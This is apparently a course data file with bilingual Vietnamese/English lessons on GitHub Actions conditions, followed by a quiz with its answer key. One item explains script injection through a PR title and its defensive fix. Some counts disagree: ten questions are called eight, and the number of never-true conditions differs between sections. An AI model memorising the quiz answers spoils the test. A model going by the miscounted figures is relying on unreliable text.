<p><strong>H: <code>if: always()</code> hay <code>if: &#36;{{ !cancelled() }}</code> — dùng cái nào để tải log?</strong><br>Đ: Nếu bạn thật sự muốn tải lên kể cả khi có người huỷ, dùng <code>always()</code>. Nếu bạn muốn "chạy trừ khi bị huỷ" (ý thường gặp), dùng <code>!cancelled()</code>; nó bị bỏ qua khi huỷ, an toàn hơn cho bất cứ thứ gì có tác dụng phụ. Cả hai gỡ mất <code>success()</code> ngầm, nên thêm điều kiện tường minh nếu bạn còn cần cả thành công.</p>
<p><strong>H: Một ô kiểm bắt buộc trên PR không bao giờ báo cáo và PR bị kẹt. Nguyên nhân hay gặp?</strong><br>Đ: Một bộ lọc <code>paths:</code> trên kích hoạt <code>pull_request</code>: khi không có gì dưới các đường dẫn thay đổi, workflow không chạy, nên ô kiểm bắt buộc không có kết quả. Vá: cho job luôn chạy và đưa điều kiện vào trong (một <code>if:</code> mức bước trên bước đắt tiền), để ô kiểm luôn báo cáo.</p>
<p><strong>H: Chỗ rẻ nhất để bỏ qua việc là đâu, và nhược điểm của nó?</strong><br>Đ: Trên kích hoạt (<code>paths</code>, <code>branches</code>) — không gì khởi động — nhưng vô hình với ô kiểm bắt buộc. <code>if:</code> mức bước tốn một lần khởi động job nhưng vẫn hiện và báo cáo; <code>if:</code> mức job lan việc bỏ qua sang mọi thứ <code>needs:</code> nó.</p>
</div>

<h3>🧪 Thực hành (20 phút)</h3>
<div class="callout ok"><p><strong>Tình huống:</strong> job deploy của bạn thỉnh thoảng chạy sau khi một run bị huỷ, và một bước báo cáo bạn thêm để bắt các cú hỏng được tha lại không bao giờ chạy. Bạn muốn ghim cả hai.</p><ol>
<li>Trong một kho thử, thêm một job có một bước <code>exit 1</code>, rồi sáu bước kiểm <code>success()</code>, <code>failure()</code>, <code>always()</code>, <code>cancelled()</code>, <code>!cancelled()</code>, và <code>always() &amp;&amp; github.ref_name == '&lt;nhánh-của-bạn&gt;'</code>.</li>
<li>Thêm một job mà bước đầu là <code>sleep 300</code> rồi sáu bước tương tự; push, huỷ sau ~10s bằng <code>gh run cancel</code>, và đọc bước nào đã chạy.</li>
<li>Thêm một bước <code>id: x</code> có <code>continue-on-error: true</code> mà hỏng; rồi hai bước, <code>if: steps.x.conclusion == 'failure'</code> và <code>if: steps.x.outcome == 'failure'</code>. Cái nào nổ?</li>
<li>Chuyển một điều kiện lọc <code>paths:</code> từ kích hoạt <code>pull_request</code> vào một <code>if:</code> mức bước và xác nhận job vẫn báo cáo khi không có gì liên quan thay đổi.</li></ol>
<p><strong>Đạt khi:</strong> bạn nói được, từ các trang run, hàm nào sống sót qua một cú hỏng và hàm nào sống sót qua một cú huỷ; bước <code>conclusion</code> không bao giờ nổ còn bước <code>outcome</code> thì có; và điều kiện đã chuyển giữ job xanh và báo cáo.</p></div>

<h3>🗂 Thuật ngữ trong bài</h3>
<div class="kv-grid">
  <div class="kv"><span class="k"><code>success()</code></span><span class="v">Mặc định ngầm: đúng khi chưa có gì hỏng. Viết ra chẳng đổi gì.</span></div>
  <div class="kv"><span class="k"><code>failure()</code></span><span class="v">Đúng khi một bước trước hoặc một job tổ tiên đã hỏng.</span></div>
  <div class="kv"><span class="k"><code>always()</code></span><span class="v">Đúng vô điều kiện, kể cả sau khi huỷ; nguy hiểm với bất cứ thứ gì có tác dụng phụ.</span></div>
  <div class="kv"><span class="k"><code>cancelled()</code> / <code>!cancelled()</code></span><span class="v">Đúng khi / sai khi run bị huỷ; <code>!cancelled()</code> là "chạy trừ khi huỷ" an toàn hơn.</span></div>
  <div class="kv"><span class="k">Lan truyền bỏ qua</span><span class="v">Một job bị bỏ qua hoặc hỏng đánh dấu các job <code>needs:</code> nó là bỏ qua theo cả chuỗi.</span></div>
  <div class="kv"><span class="k">Ô kiểm bắt buộc vô hình</span><span class="v">Bộ lọc <code>paths:</code> ở mức kích hoạt khiến workflow có thể không chạy, nên ô kiểm bắt buộc không bao giờ báo cáo.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
<li>Bất kỳ hàm trạng thái nào trong điều kiện đều gỡ mất <code>success()</code> ngầm: <code>always() &amp;&amp; …</code> chạy cả sau một cú hỏng.</li>
<li>Sau một cú hỏng: <code>failure()</code>, <code>always()</code>, <code>!cancelled()</code> chạy. Sau một cú huỷ: chỉ <code>always()</code> và <code>cancelled()</code> chạy.</li>
<li>Năm điều kiện chết/nổ sai, đo thật — cái kinh điển <code>if: 'false'</code> không nằm trong đó; nó bị bỏ qua đúng.</li>
<li>Đặt điều kiện trên bước (rẻ, hiện, vẫn báo cáo), trên job (lan bỏ qua), trên kích hoạt (rẻ nhất, vô hình với ô kiểm bắt buộc), hoặc trong bash (linh hoạt, luôn xanh).</li>
<li>Bộ lọc <code>paths:</code> trên <code>pull_request</code> có thể làm đóng băng một ô kiểm bắt buộc; hãy chuyển điều kiện vào một bước.</li>
<li>Kiểm mọi điều kiện tắt bằng một run có hiện việc bỏ qua; tệp không nói được cho bạn biết nó chạy đúng.</li>
</ul>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Workflow syntax: jobs.&lt;id&gt;.steps[*].if</span><span class="lc-sub">docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsif — <code>if:</code> được phép ở đâu, cái <code>success()</code> ngầm định, và ghi chú rằng cặp ngoặc là tuỳ chọn vì giá trị vốn đã là một biểu thức.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">actions/checkout — fetch-depth</span><span class="lc-sub">github.com/actions/checkout#usage — mặc định <code>fetch-depth: 1</code> và giá phải trả cho <code>0</code>, đó là đáp án cho cái bẫy <code>git diff</code> bên trên.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Contexts: context steps</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/contexts#steps-context — định nghĩa <code>outcome</code> và <code>conclusion</code> đặt cạnh nhau, phát biểu rõ nhất về chỗ khác biệt làm vỡ cái điều kiện chết thứ hai bên trên.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Deploy VPS — cái nhánh bạn không bao giờ đi là cái nhánh đang hỏng</span><span class="lc-sub">/courses/deploy-vps/learn${REF} — một đường lùi bản chưa từng được đi qua và đã không hoạt động vào lúc cần tới, cùng thói quen chạy cái nhánh bất thường ấy CÓ CHỦ Ý trước khi bạn cần nó.</span></span></div>
</div>
`,
    },

    /* ─────────────────────────── 3.6 ─────────────────────────── */
    {
      title: '3.6 — Chapter 3 quiz|||3.6 — Kiểm tra Chương 3',
      slug: 'ga-3-6-kiem-tra',
      type: 'QUIZ',
      description: 'Tám câu: ranh giới thay-chữ, 74 biểu thức thật, `if: \'false\'` chạy bước, `outcome` khác `conclusion`, và bản tái lập `hashFiles()` đã khớp chính xác với log thật.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Quiz</span>
<h2>What Chapter 3 measured</h2>
<p class="lead">Eight questions, twelve minutes. The centrepiece of this chapter is a verification: a six-line reproduction of <code>hashFiles()</code> matched GitHub&#39;s real output to all sixty-four hex characters.</p>

<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">3.1 — the boundary</span><span class="lz-lnote"><code>&#36;{{ }}</code> is substituted into the script <em>before</em> the shell exists; the log confirms it with <code>shell: /usr/bin/bash -e {0}</code> on every step</span></div>
<div class="lz-layer"><span class="lz-lname">3.2 — contexts</span><span class="lz-lnote">74 expressions in this repository: <code>secrets</code> 44, <code>env</code> 9, <code>runner</code> 5. An unavailable context evaluates to empty, never to an error</span></div>
<div class="lz-layer"><span class="lz-lname">3.3 — coercion</span><span class="lz-lnote">a real YAML parser shows <code>if: false</code> arriving as a boolean and <code>if: 'false'</code> as a non-empty string — so the second one runs the step</span></div>
<div class="lz-layer"><span class="lz-lname">3.4 — functions</span><span class="lz-lnote"><code>hashFiles()</code> reproduced and verified against job 85355071479; the concatenation is binary and the file list is sorted</span></div>
<div class="lz-layer"><span class="lz-lname">3.5 — conditions</span><span class="lz-lnote">three <code>if:</code> conditions in 1,394 lines of YAML, and four common conditions that can never be true</span></div>
</div>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 3 · Kiểm tra</span>
<h2>Chương 3 đã đo được gì</h2>
<p class="lead">Tám câu, mười hai phút. Trung tâm của chương này là một phép KIỂM CHỨNG: một bản tái lập <code>hashFiles()</code> dài sáu dòng đã khớp với đầu ra thật của GitHub tới cả sáu mươi tư ký tự hex.</p>

<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">3.1 — ranh giới</span><span class="lz-lnote"><code>&#36;{{ }}</code> bị thay vào script <em>TRƯỚC</em> khi shell tồn tại; log xác nhận bằng dòng <code>shell: /usr/bin/bash -e {0}</code> ở mọi bước</span></div>
<div class="lz-layer"><span class="lz-lname">3.2 — context</span><span class="lz-lnote">74 biểu thức trong kho này: <code>secrets</code> 44, <code>env</code> 9, <code>runner</code> 5. Một context không dùng được thì tính ra RỖNG, không bao giờ ra lỗi</span></div>
<div class="lz-layer"><span class="lz-lname">3.3 — ép kiểu</span><span class="lz-lnote">một bộ đọc YAML thật cho thấy <code>if: false</code> tới nơi dưới dạng boolean còn <code>if: 'false'</code> dưới dạng chuỗi khác rỗng — nên cái thứ hai CHẠY bước</span></div>
<div class="lz-layer"><span class="lz-lname">3.4 — hàm</span><span class="lz-lnote"><code>hashFiles()</code> tái lập và kiểm chứng với job 85355071479; phép nối là NHỊ PHÂN và danh sách file được SẮP XẾP</span></div>
<div class="lz-layer"><span class="lz-lname">3.5 — điều kiện</span><span class="lz-lnote">ba điều kiện <code>if:</code> trên 1.394 dòng YAML, và bốn điều kiện phổ biến không bao giờ đúng được</span></div>
</div>
</div>
`,
      quiz: {
        timeLimitSeconds: 900,
        questions: [
          {
            question: 'Where is a STEP-level expression such as `\${{ steps.x.outputs.v }}` evaluated?|||Một biểu thức ở mức BƯỚC như `\${{ steps.x.outputs.v }}` được tính ở đâu?',
            options: [
              'On the runner, when that step starts — which is why it can read values another step wrote a moment earlier|||Trên runner, khi bước ấy bắt đầu — vì thế nó đọc được giá trị mà một bước khác vừa ghi ra trước đó',
              'On GitHub’s servers, before any runner is assigned to the job|||Trên máy chủ GitHub, trước khi một runner được gán cho job',
              'By the shell, at the same time it runs the command|||Bởi shell, cùng lúc nó chạy lệnh',
              'It is not evaluated; step outputs are always literal text|||Nó không được tính; output của bước luôn là chữ nguyên văn',
            ],
            correctIndex: 0, points: 1,
            explanation: 'EN: Job-level keys are evaluated on GitHub before a machine exists; step-level keys run in the runner when the step starts, so `steps.*` and `runner.*` exist there. A measured step name carried a millisecond time written 0.1s earlier. The shell never evaluates expressions.|||VI: Khoá mức job tính trên GitHub khi chưa có máy; khoá mức bước chạy trong runner lúc bước bắt đầu, nên `steps.*` và `runner.*` tồn tại ở đó. Đo thật: tên một bước mang giờ có mili giây được ghi 0,1s trước. Shell không bao giờ tính biểu thức.',
          },
          {
            question: 'Measured on GitHub, what does `if: \'false\'` do?|||Đo thật trên GitHub, `if: \'false\'` làm gì?',
            options: [
              'Runs the step, because a non-empty string is truthy|||Chạy bước, vì một chuỗi khác rỗng là đúng',
              'Skips the step — the quotes are YAML’s, and GitHub then reads the text `false` as the expression `false`|||Bỏ qua bước — cặp nháy là của YAML, và GitHub sau đó đọc chữ `false` như biểu thức `false`',
              'Makes the workflow file invalid|||Làm tệp workflow không hợp lệ',
              'Runs the step only on the default branch|||Chỉ chạy bước trên nhánh mặc định',
            ],
            correctIndex: 1, points: 1,
            explanation: 'EN: An earlier version of this course said it runs; measured (run 36000180005) it is SKIPPED. GitHub evaluates `if:` as an expression, and `false` is false. What actually always-runs is `\${{ x }} == \'y\'` — text outside the braces makes a truthy string.|||VI: Bản trước của khoá nói nó chạy; đo thật (run 36000180005) nó BỊ BỎ QUA. GitHub tính `if:` như biểu thức, và `false` là sai. Cái thật sự luôn chạy là `\${{ x }} == \'y\'` — chữ ngoài cặp ngoặc tạo một chuỗi đúng.',
          },
          {
            question: 'A `pull_request` workflow pastes `\${{ github.event.pull_request.title }}` straight into `run:`. What is the risk and the fix?|||Một workflow `pull_request` dán `\${{ github.event.pull_request.title }}` thẳng vào `run:`. Rủi ro và cách vá là gì?',
            options: [
              'No risk — GitHub escapes event values automatically|||Không rủi ro — GitHub tự thoát các giá trị sự kiện',
              'The title is substituted into the script text before the shell runs, so a stranger’s characters become part of the command; route it through `env:` and read `"$VAR"`|||Tiêu đề bị thay vào chữ của script trước khi shell chạy, nên ký tự của người lạ thành một phần của lệnh; đưa qua `env:` rồi đọc `"$VAR"`',
              'Only a risk under `workflow_dispatch`; on `pull_request` it is safe|||Chỉ rủi ro dưới `workflow_dispatch`; trên `pull_request` thì an toàn',
              'The fix is to wrap the expression in `toJSON()`|||Cách vá là bọc biểu thức trong `toJSON()`',
            ],
            correctIndex: 1, points: 1,
            explanation: 'EN: A PR title is untrusted text; substituted into `run:` it is executed as code (run 36000955142 turned a harmless `$(echo …)` marker into a command). The fix is `env:` + quoted `"$VAR"`, so the shell reads it as data. Also avoid checking out PR code under `pull_request_target`.|||VI: Tiêu đề PR là chữ không tin được; thay vào `run:` thì bị chạy như mã (run 36000955142 biến một dấu `$(echo …)` vô hại thành một lệnh). Vá bằng `env:` + `"$VAR"` có nháy, để shell đọc như dữ liệu. Cũng tránh checkout mã PR dưới `pull_request_target`.',
          },
          {
            question: 'Why does a mistyped step id like `\${{ steps.taag.outputs.v }}` not raise an error?|||Vì sao một id bước gõ sai như `\${{ steps.taag.outputs.v }}` không báo lỗi?',
            options: [
              'An unavailable or misspelled context evaluates to the empty string, so the step runs with a blank argument|||Một context không có hoặc gõ sai tính ra chuỗi rỗng, nên bước chạy với một tham số trống',
              'GitHub falls back to the value from the previous run|||GitHub lùi về giá trị của lần chạy trước',
              'actionlint auto-corrects the id before the run|||actionlint tự sửa id trước khi chạy',
              'It does raise an error and the run fails at 0 seconds|||Nó có báo lỗi và run hỏng ở giây 0',
            ],
            correctIndex: 0, points: 1,
            explanation: 'EN: Contexts fail by being absent, not by erroring — the value is empty. This is the failure that passes review and CI. Check WHERE you wrote the expression and the spelling of ids/outputs before blaming the value.|||VI: Context hỏng bằng cách VẮNG MẶT chứ không báo lỗi — giá trị là rỗng. Đây là kiểu hỏng lọt qua review và CI. Kiểm CHỖ bạn viết biểu thức và cách gõ id/output trước khi đổ cho giá trị.',
          },
          {
            question: 'A step has `continue-on-error: true` and fails. A later step needs to react to that real failure. Which does it read?|||Một bước có `continue-on-error: true` và hỏng. Một bước sau cần phản ứng với cú hỏng thật ấy. Nó đọc cái nào?',
            options: [
              '`steps.x.conclusion == \'failure\'`|||`steps.x.conclusion == \'failure\'`',
              '`steps.x.outcome == \'failure\'` — outcome is the result BEFORE tolerance; conclusion is rewritten to success|||`steps.x.outcome == \'failure\'` — outcome là kết quả TRƯỚC khi tha; conclusion bị viết lại thành success',
              'Either works identically|||Cái nào cũng như nhau',
              '`job.status == \'failure\'`|||`job.status == \'failure\'`',
            ],
            correctIndex: 1, points: 1,
            explanation: 'EN: Measured (run 36000179986): outcome=failure, conclusion=success for a tolerated step. A condition on `conclusion` never fires — read `outcome` to react to the tolerated failure.|||VI: Đo thật (run 36000179986): outcome=failure, conclusion=success cho một bước được tha. Điều kiện trên `conclusion` không bao giờ nổ — đọc `outcome` để phản ứng với cú hỏng được tha.',
          },
          {
            question: 'A `type: boolean` input to `workflow_dispatch` — is it a string or a boolean?|||Một tham số `type: boolean` của `workflow_dispatch` — là chuỗi hay boolean?',
            options: [
              'Always a string, so you must always compare `== \'true\'`|||Luôn là chuỗi, nên phải luôn so `== \'true\'`',
              'A real boolean in the `inputs` context; only the older `github.event.inputs.x` turns it into the string `\'true\'`/`\'false\'`|||Boolean thật trong context `inputs`; chỉ `github.event.inputs.x` cũ mới biến nó thành chuỗi `\'true\'`/`\'false\'`',
              'Always a boolean everywhere|||Luôn là boolean ở mọi nơi',
              'It depends on the runner OS|||Tuỳ hệ điều hành runner',
            ],
            correctIndex: 1, points: 1,
            explanation: 'EN: Corrected from an earlier version. Chapter 1 measured (run 35987558284): `inputs.x` stays boolean, `github.event.inputs.x` is the string. A runtime string `\'false\'` is truthy, so for the event form compare `== \'true\'` or `fromJSON(...)`.|||VI: Đã sửa từ bản trước. Chương 1 đo thật (run 35987558284): `inputs.x` giữ boolean, `github.event.inputs.x` là chuỗi. Chuỗi `\'false\'` lúc chạy là đúng, nên với dạng sự kiện thì so `== \'true\'` hoặc `fromJSON(...)`.',
          },
          {
            question: 'You call `hashFiles(\'a.txt\', \'b.txt\')` and `hashFiles(\'b.txt\', \'a.txt\')`. What did the sandbox measure?|||Bạn gọi `hashFiles(\'a.txt\', \'b.txt\')` và `hashFiles(\'b.txt\', \'a.txt\')`. Sân tập đo được gì?',
            options: [
              'Two different keys — the order of separate patterns is part of the hash; a single glob like `*.txt` is order-stable|||Hai khoá khác nhau — thứ tự các mẫu tách rời là một phần của hash; một glob đơn như `*.txt` thì ổn định theo thứ tự',
              'The same key — hashFiles always sorts the files first|||Cùng một khoá — hashFiles luôn sắp xếp file trước',
              'An empty string, because two patterns are not allowed|||Một chuỗi rỗng, vì không cho phép hai mẫu',
              'A parse error at read time|||Một lỗi cú pháp lúc đọc file',
            ],
            correctIndex: 0, points: 1,
            explanation: 'EN: Corrected from an earlier version that showed them identical (that came from a Python reproduction with sorted()). Run 36000179987: the two orders differ; `hashFiles(\'*.txt\')` equals the a-then-b order. Keep pattern order fixed across workflows.|||VI: Đã sửa từ bản trước in chúng giống nhau (do bản Python có sorted()). Run 36000179987: hai thứ tự khác nhau; `hashFiles(\'*.txt\')` bằng thứ tự a-rồi-b. Giữ thứ tự mẫu cố định giữa các workflow.',
          },
          {
            question: 'A cache key is `cache-\${{ hashFiles(\'lock.json\') }}` and the glob matches nothing. What is the key?|||Một khoá cache là `cache-\${{ hashFiles(\'lock.json\') }}` và glob không khớp gì. Khoá ấy là gì?',
            options: [
              'A hash of the empty set, a fixed non-empty value|||Một hash của tập rỗng, một giá trị cố định khác rỗng',
              'The workflow fails at parse time|||Workflow hỏng lúc đọc file',
              'The cache step is skipped automatically|||Bước cache tự động bị bỏ qua',
              '`cache-` followed by nothing — hashFiles returns an empty string, a constant key that never invalidates|||`cache-` rồi hết — hashFiles trả chuỗi rỗng, một khoá hằng không bao giờ hết hiệu lực',
            ],
            correctIndex: 3, points: 1,
            explanation: 'EN: Measured (run 36000179987): `format(\'cache-{0}-{1}\', runner.os, hashFiles(\'khong-co/**\'))` produced `cache-Linux-`. No error, so a stale cache is restored forever. A key ending in a dash is the tell.|||VI: Đo thật (run 36000179987): `format(\'cache-{0}-{1}\', runner.os, hashFiles(\'khong-co/**\'))` cho ra `cache-Linux-`. Không lỗi, nên một cache cũ được phục hồi mãi. Khoá kết thúc bằng dấu gạch là dấu hiệu.',
          },
          {
            question: 'Which condition can never be true?|||Điều kiện nào không bao giờ có thể đúng?',
            options: [
              '`if: github.ref_name == \'main\'`|||`if: github.ref_name == \'main\'`',
              '`if: startsWith(github.ref, \'refs/tags/\')`|||`if: startsWith(github.ref, \'refs/tags/\')`',
              '`if: github.ref == \'main\'` — github.ref is a full ref like refs/heads/main, never the bare name|||`if: github.ref == \'main\'` — github.ref là một ref đầy đủ như refs/heads/main, không bao giờ là tên trơn',
              '`if: inputs.version != \'\'`|||`if: inputs.version != \'\'`',
            ],
            correctIndex: 2, points: 1,
            explanation: 'EN: `github.ref` is `refs/heads/main` (or `refs/pull/N/merge` on a PR), so `== \'main\'` is always false. Use `github.ref_name` for the short form. The other three are valid, everyday conditions.|||VI: `github.ref` là `refs/heads/main` (hoặc `refs/pull/N/merge` trên PR), nên `== \'main\'` luôn sai. Dùng `github.ref_name` cho dạng ngắn. Ba cái kia là điều kiện hợp lệ, thường ngày.',
          },
          {
            question: 'A step is written `if: always() && github.ref_name == \'main\'`. What surprises people?|||Một bước viết `if: always() && github.ref_name == \'main\'`. Điều gì làm người ta bất ngờ?',
            options: [
              'always() makes it run on every branch, ignoring the comparison|||always() làm nó chạy trên mọi nhánh, bỏ qua phép so sánh',
              'The two conditions cannot be combined; the file is invalid|||Hai điều kiện không kết hợp được; file không hợp lệ',
              'always() also runs the step twice|||always() còn làm bước chạy hai lần',
              'Any status function removes the implicit success(), so on main it runs even when an earlier step failed|||Bất kỳ hàm trạng thái nào cũng gỡ success() ngầm, nên trên main nó chạy cả khi một bước trước đã hỏng',
            ],
            correctIndex: 3, points: 1,
            explanation: 'EN: Measured (run 36000179986): `always() && …` ran after a failure. For "on main, only if fine", write just `if: github.ref_name == \'main\'` — success() is already implicit. On a cancel, always() runs but !cancelled() does not (run 36000179989).|||VI: Đo thật (run 36000179986): `always() && …` chạy sau một cú hỏng. Muốn "trên main, chỉ khi ổn", chỉ viết `if: github.ref_name == \'main\'` — success() vốn đã ngầm. Khi huỷ, always() chạy còn !cancelled() thì không (run 36000179989).',
          },
        ],
      },
    },
  ],
};
